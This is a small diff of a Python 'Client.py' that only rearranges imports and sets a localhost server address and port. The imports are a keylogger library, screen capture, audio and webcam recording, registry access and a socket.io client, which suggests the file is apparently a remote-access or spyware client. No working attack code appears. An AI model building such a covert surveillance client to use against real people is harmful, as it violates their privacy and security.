@@ -1,9 +1,9 @@
 # Client.py
 
-from platform import platform
-from pynput import Listener, KeyCode, keyboard
-import pyautogui, socketio.client, os.path, subprocess, time
-import socket, winreg, requests, sounddevice, soundfile, cv2
+import pyautogui, socketio.client, os.path, subprocess
+import socket, winreg, requests, sounddevice, soundfile
+import platform, cv2, time
+from pynput import keyboard
 
 server_ip = 'localhost'
 server_port = 8000
